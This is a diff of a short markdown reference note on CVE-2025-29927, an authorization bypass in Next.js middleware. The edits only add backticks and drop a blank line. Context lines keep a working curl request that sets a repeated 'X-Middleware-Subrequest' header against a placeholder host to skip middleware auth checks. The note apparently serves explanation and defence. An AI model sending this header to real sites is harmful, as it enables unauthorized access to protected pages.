@@ -1,5 +1,5 @@
 
-Next.js is a popular React framework for building full‑stack web applications (server‑side rendering, routing, middleware, API routes).
+`Next.js` is a popular React framework for building full‑stack web applications (server‑side rendering, routing, middleware, API routes).
 
 `CVE‑2025‑29927` is a critical authorization‑bypass in Next.js middleware: when an app performs auth checks in middleware, an attacker can craft a request that makes the framework treat the request as an internal subrequest, bypassing those checks.
 
@@ -22,7 +22,6 @@ curl:
 curl -v -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" \
   https://vulnerable.example/dashboard
 ```
-
 
 <b>More Information:</b> 
 - https://nextjs.org/docs/app/api-reference/file-conventions/middleware
